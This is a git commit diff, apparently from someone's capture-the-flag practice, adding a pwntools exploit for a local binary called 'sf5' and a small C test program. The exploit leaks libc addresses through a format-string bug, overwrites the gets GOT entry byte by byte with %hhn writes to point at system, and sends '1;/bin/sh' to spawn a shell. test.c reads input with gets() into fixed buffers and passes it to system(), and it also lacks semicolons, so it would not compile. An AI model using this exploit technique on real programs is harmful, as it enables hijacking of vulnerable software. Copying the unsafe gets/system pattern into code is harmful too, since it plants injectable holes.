1d18b4e487a6e41d7a92a5a8cf2931d1834dbee0
Minjea Lee <gabe0529@naver.com>
2022-02-08 09:43:27 -0800

    sf5

--- sf5/ex_sf5.py
+++ sf5/ex_sf5.py
@@ -3,12 +3,16 @@ from pwn import *
 p = process("./sf5")
 
 gets_got = 0x601048
+# [0x601038] read@GLIBC_2.2.5 -> 0x7fe3384d0350 (read) ◂— cmp 
+# p system --> $1 = {<text variable, no debug info>} 0x7fe33841e3a0 <__libc_system>
+# 0x7fe3 38 4d0350
+# 0x7fe3 38 41e3a0 
 
 p.recvuntil("exit\n")
 
 # buf_start_index --> 6
 pay = ""
-pay += "A" * 8 + "B" * 8 + "C" * 8
+# pay += "A" * 8 + "B" * 8 + "C" * 8
 pay += "%lx-" * 20
 
 p.sendline(pay)
@@ -19,5 +23,28 @@ libc_base = int(p.recvline().split(b"-")[2], 16) - 0xf7360
 sys = libc_base + 0x453a0
 
 print("libc base = {}".format(hex(libc_base)))
+print("sys = {}".format(hex(sys)))
+
+input()
+
+sys_gadget = []
+for i in range(8):
+    sys_gadget.append((sys >> 8*i)& 0xff)
+    
+print("sys_gadget = {}".format(sys_gadget))
+   
+for i in range(6):
+    pay = b""
+    pay += b"%" + str(sys_gadget[i]).encode() + b"d"
+    pay += b"%" + str(14).encode() + b"$hhn"
+
+    pay += b'B' * (8*8 - len(pay))
+    
+    pay += p64(gets_got + i)
+    
+    p.sendline(pay)
+    
+p.sendline("1;/bin/sh")
+
 
 p.interactive()
--- test.c
+++ test.c
@@ -1,8 +1,23 @@
+#pragma warning(disable:4996)
 #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
-int main(int argc, char **argv){
+int main(){
+	char buf[20];
+    char buf2[20]
+	int i;
 
-    printf("Hello World");
+	gets(buf);
+    gets(buf2)
 
-    return 0;
+	i = atoi(buf);
+
+	printf("%d\n", i);
+
+	// system("/bin/sh");
+	system(buf);
+
+
+	return 0;
 }
